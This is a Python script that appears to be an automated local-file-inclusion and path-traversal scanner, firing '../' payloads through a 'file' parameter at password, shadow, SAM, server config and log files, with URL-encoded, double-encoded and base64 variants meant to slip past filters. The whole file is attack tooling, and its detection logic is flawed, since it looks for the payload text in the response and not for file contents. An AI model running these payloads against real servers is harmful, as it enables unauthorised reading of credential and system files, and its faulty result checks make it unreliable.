import asyncio
import aiohttp
import logging
from bs4 import BeautifulSoup
from aiohttp import ClientSession, CookieJar
from urllib.parse import quote, quote_plus
from base64 import b64encode

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def test_payload(session, url, payload):
    test_url = f'{url}?file={payload}'
    try:
        async with session.get(test_url, timeout=5) as response:
            if response.status == 200:
                soup = BeautifulSoup(await response.text(), 'html.parser')
                if payload in soup.text:
                    logger.info(f'Possible LFI or File Traversal found with payload: {payload}')
                else:
                    logger.debug(f'No vulnerability found with payload: {payload}')
            else:
                logger.warning(f'Request failed with status code {response.status}')
    except Exception as e:
        logger.error(f'Error while testing payload {payload}: {e}')

async def main(url, max_depth, sleep_interval, headers, proxy):
    cookie_jar = CookieJar(unsafe=True)
    async with ClientSession(headers=headers, cookie_jar=cookie_jar) as session:
        tasks = []

        for depth in range(1, max_depth + 1):
            patterns = ['../', '..//', '..\\', '..\\\\']

            for pattern in patterns:
                base_payload = pattern * depth

                # Generate payloads for different file paths
                payloads = [
                           f'{base_payload}etc/passwd',
                           f'{base_payload}etc/shadow',
                           f'{base_payload}etc/group',
                           f'{base_payload}etc/hosts',
                           f'{base_payload}etc/apache2/apache2.conf',
                           f'{base_payload}etc/httpd/conf/httpd.conf',
                           f'{base_payload}etc/nginx/nginx.conf',
                           f'{base_payload}etc/nginx/sites-available/default',
                           f'{base_payload}etc/mysql/my.cnf',
                           f'{base_payload}etc/php/7.0/fpm/php.ini',
                           f'{base_payload}etc/php/7.0/cli/php.ini',
                           f'{base_payload}etc/php/7.2/fpm/php.ini',
                           f'{base_payload}etc/php/7.2/cli/php.ini',
                           f'{base_payload}etc/php/7.4/fpm/php.ini',
                           f'{base_payload}etc/php/7.4/cli/php.ini',
                           f'{base_payload}etc/php/8.0/fpm/php.ini',
                           f'{base_payload}etc/php/8.0/cli/php.ini',
                           f'{base_payload}var/log/auth.log',
                           f'{base_payload}var/log/apache2/access.log',
                           f'{base_payload}var/log/apache2/error.log',
                           f'{base_payload}var/log/nginx/access.log',
                           f'{base_payload}var/log/nginx/error.log',
                            f'{base_payload}var/log/mysql/error.log',
                           f'{base_payload}Windows/win.ini',
                           f'{base_payload}Windows/System32/drivers/etc/hosts',
                           f'{base_payload}Windows/System32/config/SAM',
                           f'{base_payload}Windows/repair/SAM',
                           f'{base_payload}Windows/Panther/Unattend.txt',
                           f'{base_payload}Windows/Panther/Unattended.xml',
                           f'{base_payload}Windows/debug/NetSetup.log'
                           ]

                    # Add the payloads from the previous response here
                

                # Add the obfuscated payloads
                url_encoded_payloads = [quote(payload) for payload in payloads]
                double_url_encoded_payloads = [quote(quote(payload)) for payload in payloads]
                base64_encoded_payloads = [f"data:text/plain;base64,{b64encode(payload.encode()).decode()}" for payload in payloads]

                all_payloads = payloads + url_encoded_payloads + double_url_encoded_payloads + base64_encoded_payloads

                tasks.extend([test_payload(session, url, payload) for payload in all_payloads])
                
                # Sleep between requests to prevent overwhelming the target server
                await asyncio.sleep(sleep_interval)

        if proxy:
            # Using a proxy
            async with aiohttp.ClientSession(headers=headers, cookie_jar=cookie_jar, connector=aiohttp.TCPConnector(ssl=False)) as session:
                await session.get(url, proxy=proxy)

        await asyncio.gather(*tasks)

if __name__ == '__main__':
    url = 'http://example.com/vulnerable_page.php'
    max_depth = 7  # Adjust this value based on your needs
    sleep_interval = 0.1  # Time in seconds between requests

    # Custom headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Custom-Header': 'Custom-Value'
    }

    # Proxy configuration (set to None if you don't want to use a proxy)
    proxy = 'http://proxy.example.com:8080'

    asyncio.run(main(url, max_depth, sleep_interval, headers, proxy))
